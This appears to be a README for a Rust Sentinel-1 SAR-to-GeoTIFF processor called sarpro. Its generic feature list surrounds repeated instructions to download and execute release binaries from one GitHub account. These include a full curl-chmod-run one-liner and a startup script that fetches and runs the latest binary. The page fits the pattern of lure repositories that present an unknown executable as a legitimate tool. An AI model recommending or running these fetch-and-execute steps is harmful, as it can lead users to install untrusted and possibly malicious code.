[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/AJop2323/sarpro/releases)

# sarpro — Fast Sentinel-1 SAR GRD to GeoTIFF & JPEG

🌍 🛰️ ⚙️

Project: Blazing-fast Sentinel‑1 Synthetic Aperture Radar (SAR) GRD to GeoTIFF/JPEG processor with CLI, GUI, and Rust API — autoscaling, synthetic RGB, and batch workflows.

Preview image
![Earth from space](https://images.unsplash.com/photo-1446776811953-b23d57bd21aa?auto=format&fit=crop&w=1600&q=60)

Badges
[![Build](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/AJop2323/sarpro/actions)
[![License](https://img.shields.io/badge/license-MIT-lightgrey)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-1.70-orange?logo=rust)](https://www.rust-lang.org)

What sarpro does
- Convert Sentinel-1 GRD (Ground Range Detected) products to GeoTIFF and JPEG.
- Produce synthetic RGB composites from single-polarization SAR using algorithms tuned for contrast and texture.
- Support CLI, desktop GUI, and a Rust API for integration in pipelines.
- Process large batches with autoscaling support and cloud-friendly operation.
- Integrate with GDAL and common geospatial tools.

Why use sarpro
- Speed: native Rust engine and SIMD-friendly processing.
- Quality: radiometric handling, multi-resolution resampling, and tiled GeoTIFF output.
- Flexibility: CLI for scripts, GUI for exploration, and API for embedding.
- Scale: batch workflows and autoscaling for large archives.

Key features
- Fast GRD ingestion and calibration.
- Radiometric correction and speckle-aware filters.
- Synthetic RGB generation from a single polarization channel.
- Output: georeferenced GeoTIFFs (single, multi-band) and JPEG previews.
- Batch mode with manifest files and parallel workers.
- Autoscale worker pools for cloud VMs or on-prem clusters.
- GUI with map preview, histogram, and export controls.
- Rust crate for programmatic control and custom pipelines.
- GDAL/OGR-compatible output and metadata.

Quick start

Download and run a release
- Visit the Releases page and download the matching executable or asset for your platform. The release asset needs to be downloaded and executed from: https://github.com/AJop2323/sarpro/releases
- Typical steps on Linux/macOS:
  - Download the appropriate binary from the Releases page.
  - Make it executable: chmod +x ./sarpro-linux
  - Run a test conversion: ./sarpro-linux convert --input sample-S1_GRD.zip --out sample.tif

Install from Cargo (Rust)
- cargo install sarpro-cli
- Use the CLI binary sarpro or import the sarpro crate in your project for the API.

Install system dependencies
- GDAL >= 3.0 (recommended)
- libtiff, zlib
- On Debian/Ubuntu:
  - sudo apt-get install gdal-bin libgdal-dev
- On macOS:
  - brew install gdal

CLI reference (examples)

Basic conversion
```bash
sarpro convert \
  --input /path/to/S1A_IW_GRDH_1SDV_*.zip \
  --output /out/scene.tif \
  --format geotiff \
  --calibrate
```

Generate JPEG preview and synthetic RGB
```bash
sarpro convert \
  --input /path/to/S1A_*.zip \
  --output /out/scene_preview.jpg \
  --format jpeg \
  --synthetic-rgb \
  --gamma 1.2
```

Batch processing with manifest
- Create manifest.json with an array of input paths and output targets.
```json
[
  {"input": "S1A_1.zip", "output": "S1A_1.tif"},
  {"input": "S1A_2.zip", "output": "S1A_2.tif"}
]
```
- Run:
```bash
sarpro batch --manifest manifest.json --workers 8 --log batch.log
```

Autoscaling mode
- sarpro can scale worker count based on queue depth and VM CPU usage.
- Start controller on a head node:
```bash
sarpro autoscale controller --max-workers 64 --min-workers 2 --queue redis://localhost:6379
```
- Start worker nodes:
```bash
sarpro autoscale worker --controller tcp://<controller-ip>:9090 --work-dir /data
```

GUI
- Launch local GUI:
```bash
sarpro gui --port 8080
```
- Open your browser at http://localhost:8080
- The GUI shows a map preview, data inspector, histogram stretch, and export dialog for GeoTIFF and JPEG.

Rust API
- Add to Cargo.toml
```toml
[dependencies]
sarpro = "0.3"
```
- Basic use
```rust
use sarpro::{Processor, Format};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut p = Processor::from_zip("S1A_IW_GRDH_1SDV.zip")?;
    p.calibrate(true)?;
    p.set_output_format(Format::GeoTiff)?;
    p.save("out.tif")?;
    Ok(())
}
```

Synthetic RGB
- sarpro creates synthetic RGB from intensity statistics.
- It applies locally adaptive stretching and texture enhancement.
- Parameters:
  - gamma: adjust midtone contrast.
  - contrast: linear contrast multiplier.
  - texture_strength: blend weight for texture enhancement.
- Example:
```bash
sarpro convert --input s1.zip --synthetic-rgb --gamma 1.1 --texture 0.35 --out s1_rgb.tif
```

Performance and tuning
- Use --workers to set parallel workers per node.
- Use --tile-size to set internal processing tile (default 512).
- For SSD-backed IO, drop tile-size for more parallelism.
- Memory usage scales with workers * tile-size * bands.

GDAL and interoperability
- Output GeoTIFFs are standard and include full CRS and geotransform.
- Use gdalinfo to inspect:
```bash
gdalinfo out.tif
```
- Use rasterio or QGIS to load outputs.

File formats and metadata
- GeoTIFF: tiled, internal overviews, LZW or DEFLATE compression.
- JPEG: sRGB preview, embedded thumbnail and basic metadata.
- Metadata: acquisition date, instrument, orbit, processing steps, calibration applied.

Example workflows

Local batch to GeoTIFF
- Use manifest and schedule with cron or systemd timers.
- Script sample:
```bash
#!/bin/bash
sarpro batch --manifest /data/manifest.json --workers 6 --output-dir /out
```

Cloud autoscale pipeline
- Use Redis for queue and a controller VM for autoscale logic.
- Worker VMs boot with a startup script that pulls the latest release binary from the Releases page and registers with the controller.
- Example startup steps:
  - curl -L -o sarpro https://github.com/AJop2323/sarpro/releases/download/vX.Y.Z/sarpro-linux
  - chmod +x sarpro
  - ./sarpro autoscale worker --controller tcp://controller:9090 --work-dir /data

Note about the Releases download
- The release page contains platform binaries and assets. Download the executable asset that matches your OS and run it. Example: curl -L -o sarpro-linux https://github.com/AJop2323/sarpro/releases/download/vX.Y.Z/sarpro-linux && chmod +x sarpro-linux && ./sarpro-linux
- Visit the releases page to find the correct file: https://github.com/AJop2323/sarpro/releases

Diagnostics and logs
- CLI writes logs to stdout by default. Use --log /path/to/log to save logs.
- GUI stores session logs in ~/.sarpro/logs/.
- Use --verbose or set RUST_LOG=info for detailed traces.

Common issues
- If GDAL cannot open input, check that the ZIP contains the expected SAFE or GRD product.
- If outputs show strong striping, try a speckle filter option:
  - --speckle median --speckle-size 3

Integration tips
- Use sarpro as a preprocessing step for machine learning models.
- Export JPEG tiles for web mapping or thumbnails.
- Use the Rust API to integrate SAR preprocessing into data ingestion pipelines.

Contributing
- Fork the repo, create a feature branch, and open a pull request.
- Run tests with cargo test.
- Follow formatting with rustfmt and clippy.
- Add unit tests for algorithmic changes.

License
- MIT License. See LICENSE file.

Community and support
- Open issues for bugs or feature requests.
- Use GitHub Discussions for design questions and usage patterns.

Changelog and releases
- Find binaries, release notes, and tagged versions on the Releases page:
  - https://github.com/AJop2323/sarpro/releases
- Download the proper asset per platform and follow the included release instructions.

Assets and images
- Use GDAL and QGIS to inspect outputs.
- For quick visual checks, open generated JPEGs.

Credits
- Built with Rust, GDAL, and a mix of open-source libraries.
- Inspired by Sentinel-1 processing needs and common remote sensing workflows.

Contact
- Open an issue or pull request on GitHub to report problems or suggest changes.

Screenshots
![SAR preview](https://upload.wikimedia.org/wikipedia/commons/5/5f/ERS-1_SAR_image.jpg)